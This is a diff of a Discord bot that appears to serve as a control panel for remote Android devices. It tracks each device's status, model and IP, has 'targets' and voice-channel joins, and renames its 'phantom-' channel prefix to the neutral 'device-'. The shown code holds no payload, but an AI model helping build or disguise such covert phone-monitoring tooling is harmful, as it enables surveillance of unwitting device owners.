@@ -205,11 +205,11 @@ function formatCommandLog(userId) {
 }
 
 function getPhantomChannels(guild) {
-  return guild.channels.cache.filter(c => c.type === ChannelType.GuildText && c.name.startsWith('phantom-'))
+  return guild.channels.cache.filter(c => c.type === ChannelType.GuildText && c.name.startsWith('device-'))
 }
 
 function findPhantomChannel(guild, name) {
-  const prefix = name.startsWith('phantom-') ? name : 'phantom-' + name
+  const prefix = name.startsWith('device-') ? name : 'device-' + name
   return guild.channels.cache.find(c => c.type === ChannelType.GuildText && c.name === prefix)
 }
 
@@ -324,7 +324,7 @@ function buildDevicePages(guild) {
       const status = on ? `${A.green}${E.sparkles} ALIVE${A.reset}` : `${A.grey}${E.coffin} DEAD${A.reset}`
       const dot = on ? E.online : E.offline
       const bar = on ? barAnim(1, 1, 5) : '░░░░░'
-      lines.push(`${A.cyan}┃${A.reset} ${dot} ${mono(ch.name.replace('phantom-', ''))} ${bar} ${status} ${A.grey}(${ago})${A.reset}`)
+      lines.push(`${A.cyan}┃${A.reset} ${dot} ${mono(ch.name.replace('device-', ''))} ${bar} ${status} ${A.grey}(${ago})${A.reset}`)
     }
     lines.push('')
     const pct = sorted.length ? Math.round((onlineCount / sorted.length) * 100) : 0
@@ -735,7 +735,7 @@ client.on(Events.InteractionCreate, async (i) => {
 
           const botUrl = process.env.BOT_HTTP_URL
           const textChannelId = i.channelId
-          const deviceId = deviceCh.name.replace('phantom-', '')
+          const deviceId = deviceCh.name.replace('device-', '')
 
           await i.editReply({ content: `${E.satellite} **Joining voice channel**...\nVoice: \`${voiceChannel.name}\`` })
 
@@ -777,7 +777,7 @@ client.on(Events.InteractionCreate, async (i) => {
             const data = targets.get(uid)
             const chId = typeof data === 'object' ? data.chId : data
             const ch = i.guild.channels.cache.get(chId)
-            if (ch) deviceId = ch.name.replace('phantom-', '')
+            if (ch) deviceId = ch.name.replace('device-', '')
           }
           if (!deviceId) {
             return i.editReply(`${E.warning} No target selected. Use \`/target\` first ${E.skull}`)
@@ -1072,7 +1072,7 @@ client.on(Events.InteractionCreate, async (i) => {
 // ── Heartbeat watcher (real-time status updates) ────────────────────────────
 
 client.on(Events.MessageCreate, (msg) => {
-  if (msg.author.bot && msg.channel.name?.startsWith('phantom-')) {
+  if (msg.author.bot && msg.channel.name?.startsWith('device-')) {
     const content = msg.content || ''
     if (content.includes(':heartbeat:') || content.includes('**Alive**') ||
         content.includes('**Device Online**') || content.includes('**Reconnected**') ||
@@ -1427,7 +1427,7 @@ async function refreshDeviceStatus(guild, sendAlerts = false) {
   guildCheckLocks.add(gid)
   try {
     const allChannels = await guild.channels.fetch()
-    const channels = allChannels.filter(c => c.type === ChannelType.GuildText && c.name.startsWith('phantom-'))
+    const channels = allChannels.filter(c => c.type === ChannelType.GuildText && c.name.startsWith('device-'))
     const alertCh = sendAlerts ? await getAlertChannel() : null
     await Promise.allSettled([...channels].map(async ([, ch]) => {
       if (deviceCheckLocks.has(ch.id)) return
@@ -1465,7 +1465,7 @@ async function refreshDeviceStatus(guild, sendAlerts = false) {
         if (Date.now() - lastAlert < 120000) return
         if (Date.now() - botStartTime < 30000) return
         alertCooldown.set(cooldownKey, Date.now())
-        let mModel = ch.name.replace('phantom-', ''), mAndroid = '?', mIp = '?'
+        let mModel = ch.name.replace('device-', ''), mAndroid = '?', mIp = '?'
         try {
           const msgs = await ch.messages.fetch({ limit: 25 })
           for (const [, m] of msgs) {
@@ -1479,7 +1479,7 @@ async function refreshDeviceStatus(guild, sendAlerts = false) {
           }
         } catch (_) {}
 
-        const deviceName = ch.name.replace('phantom-', '')
+        const deviceName = ch.name.replace('device-', '')
         let cardBuffer = null
         try {
           cardBuffer = await statusCard({
@@ -1695,7 +1695,7 @@ client.on(Events.GuildDelete, (guild) => {
     statusCheckers.delete(gid)
   }
   for (const [, ch] of guild.channels.cache) {
-    if (ch.name.startsWith('phantom-')) {
+    if (ch.name.startsWith('device-')) {
       deviceStatus.delete(ch.id)
       targets.forEach((data, uid) => {
         const chId = typeof data === 'object' ? data.chId : data
